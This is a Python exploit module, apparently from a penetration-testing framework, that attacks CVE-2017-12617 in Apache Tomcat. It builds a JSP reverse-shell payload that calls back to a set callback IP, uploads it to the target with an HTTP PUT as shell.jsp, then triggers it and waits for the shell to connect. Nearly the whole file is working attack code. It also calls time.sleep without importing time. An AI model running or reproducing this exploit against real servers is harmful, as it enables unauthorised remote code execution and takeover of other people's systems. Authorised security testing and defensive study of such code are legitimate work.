#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import httplib
import urllib2
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_apache_tomcat_fu_rce"
INFO['DESCRIPTION'] = "Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution"
INFO['VENDOR'] = "http://tomcat.apache.org/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42966/']
INFO["CVE Name"] = "CVE-2017-12617"
INFO["NOTES"] = """It possible to upload a JSP file to the server via a specially crafted request with HTTP PUTs enabled
"""

INFO['CHANGELOG'] = "10 Oct, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.207", dict(description = 'Target IP')
OPTIONS["PORT"] = 8080, dict(description = 'Target port')
OPTIONS["CALLBACK_IP"] = "192.168.1.43", dict(description = 'Callback IP')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            self.finish(False)

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.JSP, False)

        self.log("[>] Shellcode ready")
        return shellcode
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        try:
            conn = httplib.HTTPConnection('{}:{}'.format(self.host, self.port))
            conn.request('PUT', '/shell.jsp/', self.make_sploit())
            result = conn.getresponse()
            if result.status == 201:
                self.log('Success!')
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('Shell uploaded. Execute shell.jsp ...')
        try:
            urllib2.urlopen(self.make_url('/shell.jsp'), timeout=3)
        except Exception as e:
            pass
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
